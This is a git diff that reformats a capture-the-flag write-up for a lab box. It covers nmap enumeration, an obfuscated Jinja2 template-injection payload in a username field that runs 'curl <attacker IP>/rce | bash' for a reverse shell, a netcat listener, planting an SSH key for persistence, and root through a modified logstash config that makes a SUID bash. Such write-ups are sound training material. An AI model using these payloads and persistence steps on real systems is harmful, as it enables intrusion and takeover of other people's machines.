@@ -1,5 +1,7 @@
-FamilyFriendly
+# FamilyFriendly
 
+## Enumeration
+```bash
 └─$ nmap -A -p- -sC -T4 10.10.205.16 -oX nmap.out                    
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-29 14:25 BST
 Nmap scan report for 10.10.205.16
@@ -29,24 +31,41 @@ Nmap done: 1 IP address (1 host up) scanned in 29.09 seconds
 Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 
 └─$ telnet <IP> 23 
-
+```
+### I found a secret path with fuff
+```bash
 http://10.10.101.61:48151/temporary/dev/new/account
-
+```
+### I create a user with the following password and when I connect, the password gives me a reverse shell.
+```js
 username = {{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("curl 10.8.37.214/rce | bash")|attr("read")()}}
-
+```
+```bash
 python3 -m http.server 80
 
 nc -lnvp 4444
+```
+## User FLAG
 
-login and go in account page
+```cat /home/deadpool/user.txt``` : EPI{R_j00_5UR3_j00R3_n07_pHR0M_7H3_Dc_UN1V3r23}
 
-got shell as deadpool
+## Privilege Escalation
 
-cat /home/deadpool/user.txt = EPI{R_j00_5UR3_j00R3_n07_pHR0M_7H3_Dc_UN1V3r23}
-
+```bash
 echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEVHSInmKKk3Z3UHbvtH9LHOnWkDTnKFtoPTRMI2+J+a mariusmarolleau@gmail.com" > authorized_keys
+```
 
+### linpeas gives me a vulnerability
 cd /etc/logstash/conf.d
 
-modifie the file in this directory to get a bash with a suid in deadpool's home
+### modifie the file in this directory to get a bash with a suid in deadpool's home
 
+```bash
+cd /home/deadpool
+./bash -p
+```
+### Got a shell as root
+
+## Root FLAG
+
+I forgot to write it :(
